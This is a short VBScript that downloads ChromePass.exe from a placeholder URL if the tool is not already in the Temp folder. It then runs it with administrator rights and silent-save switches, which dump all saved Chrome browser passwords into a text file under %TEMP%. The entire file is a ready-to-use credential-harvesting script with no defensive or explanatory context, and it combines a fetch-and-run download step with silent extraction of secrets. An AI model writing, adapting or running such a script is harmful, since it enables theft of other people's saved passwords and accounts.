Option Explicit

Dim filename, exePath, outputFolder, outputFile, args, fso, shellApp, shell, tempFolder
Dim downloadURL, downloadSuccess

' <-- PUT THE DIRECT DOWNLOAD URL FOR ChromePass.exe HERE -->
downloadURL = "https://example.com/ChromePass.exe"

Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")

filename = "ChromePass.exe"
exePath = FindFileInTemp(filename)

Set fso = CreateObject("Scripting.FileSystemObject")

' If not found in TEMP, download it
If exePath = "" Then
    downloadSuccess = DownloadFile(downloadURL, tempFolder & "\" & filename)
    If Not downloadSuccess Then
        MsgBox "Failed to download " & filename & " to Temp folder.", vbCritical, "Download Error"
        WScript.Quit
    Else
        exePath = tempFolder & "\" & filename
    End If
End If

If exePath = "" Then
    MsgBox "ChromePass.exe not found in Temp folder.", vbCritical, "Error"
    WScript.Quit
End If

' Store extracted passwords in %TEMP%\ExtractedPasswords
outputFolder = tempFolder & "\ExtractedPasswords"
outputFile = outputFolder & "\ChromePasswords.txt"

If Not fso.FolderExists(outputFolder) Then
    fso.CreateFolder(outputFolder)
End If

args = "/stext """ & outputFile & """ /all /savesilent"

Set shellApp = CreateObject("Shell.Application")
shellApp.ShellExecute exePath, args, "", "runas", 1

' === Function to search for the file in Temp ===
Function FindFileInTemp(fileName)
    Dim shell, tempFolderLocal, folder, file, fsoLocal
    Set shell = CreateObject("WScript.Shell")
    tempFolderLocal = shell.ExpandEnvironmentStrings("%TEMP%")
    
    Set fsoLocal = CreateObject("Scripting.FileSystemObject")
    
    If fsoLocal.FolderExists(tempFolderLocal) Then
        Set folder = fsoLocal.GetFolder(tempFolderLocal)
        For Each file In folder.Files
            If LCase(file.Name) = LCase(fileName) Then
                FindFileInTemp = file.Path
                Exit Function
            End If
        Next
    End If
    
    FindFileInTemp = ""  ' File not found
End Function

' === Function to download a file (binary safe) ===
Function DownloadFile(url, savePath)
    On Error Resume Next
    Dim xmlhttp, adoStream, result
    result = False

    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    xmlhttp.Open "GET", url, False
    xmlhttp.Send

    If xmlhttp.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 ' adTypeBinary
        adoStream.Open
        adoStream.Write xmlhttp.responseBody
        ' Overwrite if exists
        If CreateObject("Scripting.FileSystemObject").FileExists(savePath) Then
            CreateObject("Scripting.FileSystemObject").DeleteFile savePath, True
        End If
        adoStream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
        adoStream.Close
        result = True
    Else
        result = False
    End If

    On Error GoTo 0
    DownloadFile = result
End Function
